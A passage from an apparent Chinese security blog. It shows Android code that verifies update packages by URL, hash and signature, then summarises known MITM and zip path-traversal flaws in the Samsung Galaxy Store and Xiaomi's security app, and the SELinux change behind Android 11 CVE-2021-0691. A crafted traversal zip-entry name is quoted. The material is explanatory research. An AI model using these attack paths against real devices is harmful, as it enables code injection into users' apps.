class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> DataBean <span class="title function_">getData</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setData</span><span class="params">(DataBean data)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.data = data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">DataBean</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> String description;</span><br><span class="line">        <span class="keyword">private</span> String downUrl;</span><br><span class="line">        <span class="keyword">private</span> String version;</span><br><span class="line">        <span class="keyword">private</span> String hashcod;</span><br><span class="line">        <span class="keyword">private</span> String key;</span><br><span class="line">        <span class="keyword">private</span> String isForce;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getDescription</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> description;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setDescription</span><span class="params">(String description)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.description = description;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getDownUrl</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> downUrl;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setDownUrl</span><span class="params">(String downUrl)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.downUrl = downUrl;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getVersion</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> version;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setVersion</span><span class="params">(String version)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.version = version;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getHashcod</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> hashcod;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setHashcod</span><span class="params">(String hashcod)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.hashcod = hashcod;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getKey</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> key;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setKey</span><span class="params">(String key)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.key = key;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getIsForce</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> isForce;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setIsForce</span><span class="params">(String isForce)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.isForce = isForce;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>请求</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">UpgradeModel</span>  <span class="variable">aResult</span> <span class="operator">=</span> xxxx<span class="comment">//解析服务器返回的后数据</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (aResult != <span class="literal">null</span> &amp;&amp; aResult.getData() != <span class="literal">null</span> ) &#123;        </span><br><span class="line">       <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> aResult.getData().getDownUrl(); </span><br><span class="line">       <span class="keyword">if</span> (url == <span class="literal">null</span> || !TextUtils.equals(url, <span class="string">&quot;这里是你知道的下载地址：也可以只验证hostUrl&quot;</span>)) &#123;</span><br><span class="line">              <span class="comment">// 如果符合，说明不是目标下载地址，就不去下载</span></span><br><span class="line"></span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>

<p>下载</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> DownUtils.getFile(url); <span class="comment">// 监测是否要重新下载</span></span><br><span class="line"><span class="keyword">if</span> (file.exists() &amp;&amp;   TextUtils.equals(aResult.getData().getHashCode(), EncryptUtils.Md5File(file))) </span><br><span class="line">  &amp;&amp; TextUtils.equals(aResult.getData().getKey(), DownLoadModel.getData().getKey()) &#123;/   </span><br><span class="line">       <span class="comment">// 如果符合，就去安装 不符合重新下载 删除恶意文件</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>安装</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** installApK</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> context</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> path</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> name</span></span><br><span class="line"><span class="comment">*/</span><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">installApK</span><span class="params">(Context context, <span class="keyword">final</span> String path, <span class="keyword">final</span> String name )</span> &#123;    </span><br><span class="line">       <span class="keyword">if</span> (!SafetyUtils.checkFile(path + name, context)) &#123;        </span><br><span class="line">              <span class="keyword">return</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span> (!SafetyUtils.checkPagakgeName(context, path + name)) &#123;</span><br><span class="line">              Toast.makeText(context, <span class="string">&quot;升级包被恶意软件篡改 请重新升级下载安装&quot;</span>, Toast.LENGTH_SHORT ).show();</span><br><span class="line">              DLUtils.deleteFile(path + name);</span><br><span class="line">              ((Activity)context).finish();</span><br><span class="line">              <span class="keyword">return</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">switch</span> (SafetyUtils.checkPagakgeSign(context, path + name)) &#123;</span><br><span class="line">       <span class="keyword">case</span> SafetyUtils.SUCCESS:</span><br><span class="line">              DLUtils.openFile(path + name, context);</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">       <span class="keyword">case</span> SafetyUtils.SIGNATURES_INVALIDATE:</span><br><span class="line">              Toast.makeText(context, <span class="string">&quot;升级包安全校验失败 请重新升级&quot;</span>, Toast.LENGTH_SHORT ).show();</span><br><span class="line">              ((Activity)context).finish();</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">       <span class="keyword">case</span> SafetyUtils.VERIFY_SIGNATURES_FAIL:</span><br><span class="line">              Toast.makeText(context, <span class="string">&quot;升级包为盗版应用 请重新升级&quot;</span>, Toast.LENGTH_SHORT ).show();</span><br><span class="line">              ((Activity)context).finish();</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">       <span class="keyword">default</span>:</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>安全校验</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 安全校验</span></span><br><span class="line"><span class="comment">* Created by LIUYONGKUI on 2016-04-21.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SafetyUtils</span> &#123;</span><br><span class="line">    <span class="comment">/** install sucess */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">SUCCESS</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** SIGNATURES_INVALIDATE */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">SIGNATURES_INVALIDATE</span> <span class="operator">=</span> <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** SIGNATURES_NOT_SAME */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">VERIFY_SIGNATURES_FAIL</span> <span class="operator">=</span> <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** is needcheck */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">NEED_VERIFY_CERT</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * checkPagakgeSigns.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">checkPagakgeSign</span><span class="params">(Context context, String srcPluginFile)</span> &#123;</span><br><span class="line">        <span class="type">PackageInfo</span> <span class="variable">PackageInfo</span> <span class="operator">=</span> context.getPackageManager()</span><br><span class="line">                                         .getPackageArchiveInfo(srcPluginFile, <span class="number">0</span>); <span class="comment">//Signature[] pluginSignatures = PackageInfo.signatures;</span></span><br><span class="line">        Signature[] pluginSignatures = PackageVerifyer.collectCertificates(srcPluginFile,</span><br><span class="line">                <span class="literal">false</span>);</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isDebugable</span> <span class="operator">=</span> (<span class="number">0</span> != (context.getApplicationInfo().flags &amp;</span><br><span class="line">            ApplicationInfo.FLAG_DEBUGGABLE));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (pluginSignatures == <span class="literal">null</span>) &#123;</span><br><span class="line">            PaLog.e(<span class="string">&quot;签名验证失败&quot;</span>, srcPluginFile);</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">File</span>(srcPluginFile).delete();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> SIGNATURES_INVALIDATE;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (NEED_VERIFY_CERT &amp;&amp; !isDebugable) &#123; <span class="comment">//可选步骤，验证APK证书是否和现在程序证书相同。</span></span><br><span class="line"></span><br><span class="line">            Signature[] mainSignatures = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">PackageInfo</span> <span class="variable">pkgInfo</span> <span class="operator">=</span> context.getPackageManager()</span><br><span class="line">                                             .getPackageInfo(context.getPackageName(),</span><br><span class="line">                        PackageManager.GET_SIGNATURES);</span><br><span class="line">                mainSignatures = pkgInfo.signatures;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (PackageManager.NameNotFoundException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!PackageVerifyer.isSignaturesSame(mainSignatures,</span><br><span class="line">                        pluginSignatures)) &#123;</span><br><span class="line">                PaLog.e(<span class="string">&quot;升级包证书和旧版本证书不一致&quot;</span>, srcPluginFile);</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">File</span>(srcPluginFile).delete();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> VERIFY_SIGNATURES_FAIL;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> SUCCESS;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * checkPagakgeName</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> context</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> srcNewFile</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">checkPagakgeName</span><span class="params">(Context context, String srcNewFile)</span> &#123;</span><br><span class="line">        <span class="type">PackageInfo</span> <span class="variable">packageInfo</span> <span class="operator">=</span> context.getPackageManager()</span><br><span class="line">                                         .getPackageArchiveInfo(srcNewFile,</span><br><span class="line">                PackageManager.GET_ACTIVITIES);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (packageInfo != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> TextUtils.equals(context.getPackageName(),</span><br><span class="line">                packageInfo.packageName);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * checkFile</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> aPath</span></span><br><span class="line"><span class="comment">    *            文件路径</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> context</span></span><br><span class="line"><span class="comment">    *            context</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">checkFile</span><span class="params">(String aPath, Context context)</span> &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">aFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(aPath);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((aFile == <span class="literal">null</span>) || !aFile.exists()) &#123;</span><br><span class="line">            Toast.makeText(context, <span class="string">&quot;安装包已被恶意软件删除&quot;</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (context == <span class="literal">null</span>) &#123;</span><br><span class="line">            Toast.makeText(context, <span class="string">&quot;安装包异常&quot;</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="额外的漏洞"><a href="#额外的漏洞" class="headerlink" title="额外的漏洞"></a>额外的漏洞</h1><p>是漏洞，也算是不安全的开发方式吧。</p>
<h2 id="通过-MITM-的三星-Galaxy-应用商店-RCE"><a href="#通过-MITM-的三星-Galaxy-应用商店-RCE" class="headerlink" title="通过 MITM 的三星 Galaxy 应用商店 RCE"></a>通过 MITM 的三星 Galaxy 应用商店 RCE</h2><p>原文链接：<a target="_blank" rel="noopener" href="https://www.adyta.pt/en/noticias/news-1/">https://www.adyta.pt/en/noticias/news-1/</a></p>
<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>Galaxy Apps Store 检索一个特定于国家&#x2F;地区的 URL 以供商店使用。此请求有时会定期发生，或者在您第一次启动应用程序时或您的 MCC（移动国家代码）发生变化时发生。但是，此请求是使用 HTTP 而不是 HTTPS 发出的，这允许 MITM（中间人）攻击。</p>
<p>在这个 POST 请求中，设备发送有关设备状态的信息，例如：MCC、MNC、设备型号和语言。在响应中，将返回一个CountryURL 以供 Store 使用。CountryURL 包含 HTTP URL，但应用程序将在下一个请求中使用 HTTPS。</p>
<p><img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/image3.png" alt="image3"></p>
<p><img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/image1.png" alt="image1"></p>
<p>中间人</p>
<p><img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/image4.png" alt="image4"></p>
<h2 id="小米预装安全App漏洞"><a href="#小米预装安全App漏洞" class="headerlink" title="小米预装安全App漏洞"></a>小米预装安全App漏洞</h2><p>原文链接：<a target="_blank" rel="noopener" href="https://research.checkpoint.com/2019/vulnerability-in-xiaomi-pre-installed-security-app/">https://research.checkpoint.com/2019/vulnerability-in-xiaomi-pre-installed-security-app/</a></p>
<h3 id="1、Avast更新漏洞"><a href="#1、Avast更新漏洞" class="headerlink" title="1、Avast更新漏洞"></a>1、Avast更新漏洞</h3><p>安全APP使用Avast、AVL 和腾讯进行杀毒，默认情况下，将 Avast 设置为应用程序的安全扫描程序，应用程序通过将<code>avast-android-vps-v4-release.apk</code> APK 文件下载到 <code>Guard Provider</code> 的私有目录：<code>/data/data/com.miui.guardprovider/app_dex/vps_update*_&lt;timestamp&gt;*.apk</code> 来定期更新其病毒库。</p>
<p>但是，更新机制使用不安全的 HTTP 连接来下载此文件。</p>
<h3 id="2、AVL-更新路径遍历漏洞"><a href="#2、AVL-更新路径遍历漏洞" class="headerlink" title="2、AVL 更新路径遍历漏洞"></a>2、AVL 更新路径遍历漏洞</h3><p>一旦阻止与Avast服务器的连接，APP就会把默认的杀毒软件换成另一个–在这种情况下是AVL反病毒软件。</p>
<p>在AVL成为默认杀毒软件后，它将立即用其病毒数据库更新该应用。它通过请求一个配置文件（如<a target="_blank" rel="noopener" href="https://update.avlyun.sec.miui.com/avl_antiy/miuistd/siglib/20180704.cj.conf%EF%BC%89%E6%9D%A5%E6%A3%80%E6%9F%A5%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%96%B0%E7%9A%84%E7%97%85%E6%AF%92%E7%AD%BE%E5%90%8D%E3%80%82%E8%BF%99%E4%B8%AA%60.conf%60%E6%96%87%E4%BB%B6%E6%98%AF%E7%BA%AF%E6%96%87%E6%9C%AC%E6%A0%BC%E5%BC%8F%E7%9A%84%EF%BC%8C%E8%A1%A8%E6%98%8E%E6%9C%89%E6%96%B0%E7%AD%BE%E5%90%8D%E7%9A%84ZIP%E6%A1%A3%E6%A1%88%E7%9A%84URL%E3%80%81%E5%A4%A7%E5%B0%8F%E5%92%8CMD5%E5%93%88%E5%B8%8C%E5%80%BC%E3%80%82">https://update.avlyun.sec.miui.com/avl_antiy/miuistd/siglib/20180704.cj.conf）来检查是否存在新的病毒签名。这个`.conf`文件是纯文本格式的，表明有新签名的ZIP档案的URL、大小和MD5哈希值。</a></p>
<p>在处理完配置文件后，AVL会下载<code>read_update_url</code>字段中指示的zip文件，并将其解压到Guard Provider目录中。</p>
<p>MITM攻击者能够改变<code>.conf</code>文件的内容，因为它是通过非安全连接下载的，使用<code>is_new=0</code>来显示新的更新的存在，并提供URL链接到一个精心制作的ZIP文件。</p>
<p><img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/fig5.webp" alt="fig5"></p>
<p>AVL SDK还存在路径穿越漏洞，因此，攻击者能够使用精心制作的zip文件来覆盖应用程序沙盒中的任何文件。</p>
<p>因此，一个精心制作的APK，作为<code>.../.../app_dex/vps_update_20190205-124933.apk</code>条目附加到ZIP签名的存档中，将成功覆盖之前从Avast下载的更新，因为两个反病毒SDK组件在相同的沙盒中。</p>
<p>然后释放Avast的通信，并阻止AVL的通信，直到APP再次选择Avast作为活动的反病毒软件。由于Guard Provider对Avast更新的签名文件的校验只在下载时进行，在运行时就不再检查，恶意APK将被加载执行。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://buffer0verflooow.github.io/2022/07/04/Android-11-%E9%AD%94%E5%BD%A2%E5%A5%B3%E6%BC%8F%E6%B4%9E/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="buffer0verflooow">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="buffer0verflooow - Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | buffer0verflooow - Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/07/04/Android-11-%E9%AD%94%E5%BD%A2%E5%A5%B3%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">Android 11 魔形女漏洞</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-07-04 20:34:01" itemprop="dateCreated datePublished" datetime="2022-07-04T20:34:01+08:00">2022-07-04</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2022-07-30 14:58:15" itemprop="dateModified" datetime="2022-07-30T14:58:15+08:00">2022-07-30</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>可以参考京东的<a target="_blank" rel="noopener" href="https://dawnslab.jd.com/mystique-paper/mystique-paper.pdf">白皮书</a>，漏洞倒是不难理解，本来是想写exp的，但是有点累🥱，想想还是先整理整理文档，找找感觉吧。</p>
<h1 id="1-CVE-2021-0691"><a href="#1-CVE-2021-0691" class="headerlink" title="1. CVE-2021-0691"></a>1. CVE-2021-0691</h1><p>这是一个AOSP的漏洞，对于正常的<code>system_app</code>的<code>Selinux</code>策略来讲，不应该具备写<code>/data/app</code>目录的权限，但是Android 11 中却加入了：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">index e5d7d18..1432017 100644</span><br><span class="line">--- a/private/system_app.te</span><br><span class="line">+++ b/private/system_app.te</span><br><span class="line">@@ -69,6 +69,9 @@</span><br><span class="line"><span class="comment"># Settings need to access app name and icon from asec</span></span><br><span class="line">allow system_app asec_apk_file:file r_file_perms;</span><br><span class="line">+# Allow system_app (adb data loader) to write data to /data/incremental</span><br><span class="line">+allow system_app apk_data_file:file write;</span><br><span class="line">+</span><br><span class="line"><span class="comment"># Allow system apps (like Settings) to interact with statsd</span></span><br><span class="line">binder_call(system_app, statsd)</span><br></pre></td></tr></table></figure>

<p><code>apk_data_file</code>指的是<code>/data/app</code>，这里存放的是应用程序的代码文件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">a70q:/data/app/com.unionpay.tsmservice-0bfCG-Zd90PuEwegtR8UzQ== # ls -lR</span><br><span class="line">.:</span><br><span class="line">total 6184</span><br><span class="line">-rw-r--r-- 1 system system 6308538 2021-01-01 01:22 base.apk</span><br><span class="line">drwxr-xr-x 3 system system 4096 2021-01-01 01:22 lib</span><br><span class="line">drwxrwx--x 3 system install 4096 2021-01-01 01:22 oat</span><br><span class="line">./lib:</span><br><span class="line">total 8</span><br><span class="line">drwxr-xr-x 2 system system 4096 2021-01-01 01:22 arm64</span><br><span class="line">./lib/arm64:</span><br><span class="line">total 2092</span><br><span class="line">-rwxr-xr-x 1 system system 185816 1979-11-30 00:00 libentryexpro.so</span><br><span class="line">-rwxr-xr-x 1 system system 723744 1979-11-30 00:00 libuptsmaddon.so</span><br><span class="line">-rwxr-xr-x 1 system system 1216480 1979-11-30 00:00 libuptsmservice.so</span><br><span class="line">./oat:</span><br><span class="line">total 8</span><br><span class="line">drwxrwx--x 2 system install 4096 2021-01-01 01:22 arm64</span><br><span class="line">./oat/arm64:</span><br><span class="line">total 2588</span><br><span class="line">-rw-r--r-- 1 system all_a192 28672 2021-01-01 01:22 base.art</span><br><span class="line">-rw-r--r-- 1 system all_a192 87712 2021-01-01 01:22 base.odex</span><br><span class="line">-rw-r--r-- 1 system all_a192 2517132 2021-01-01 01:22 base.vdex</span><br></pre></td></tr></table></figure>

<p>这个改动意味着，拥有<code>system_app uid</code> 的程序能够去覆写其他APP的代码文件，包括<code>so</code>和<code>base.apk</code>，实现代码注入。这个代码的引入是因为<code>incremental install</code>功能，这个功能用于大小超过1 GB的应用程序的安装，在<code>Android 11 Preview 1</code>中，<code>AdbDataLoader</code>被加入以支持<code>incremental install</code>，因此，<code>system_app</code>的策略被修改了。虽然后来经过了一些变动（<code>AdbDataLoader</code>被移除了），但是这个策略却被保留了下来。</p>
<h1 id="2-漏洞利用-静态分析"><a href="#2-漏洞利用-静态分析" class="headerlink" title="2. 漏洞利用 - 静态分析"></a>2. 漏洞利用 - 静态分析</h1><p>为了利用第一步中发现的漏洞，做了一些静态分析的工作，其实，利用思路也很简单，就是从系统应用程序中，找到一个bug，这个bug可以实现任意文件写。</p>
<p>这个问题可以转化为<code>Java</code>语言的<code>source-sink</code>类型的<code>data-flow</code>污点分析问题，可以使用基于<code>Soot</code>的<a target="_blank" rel="noopener" href="https://github.com/Sable/heros"><code>IFDS</code></a>（<code>Inter-procedure</code>， <code>Finite</code>， <code>Distributive</code>）框架进行解决。</p>
<p>对于任一污点分析问题，我们首先应该定义清楚<code>source</code>和<code>sink</code>，对于<code>source</code>的定义如下：</p>
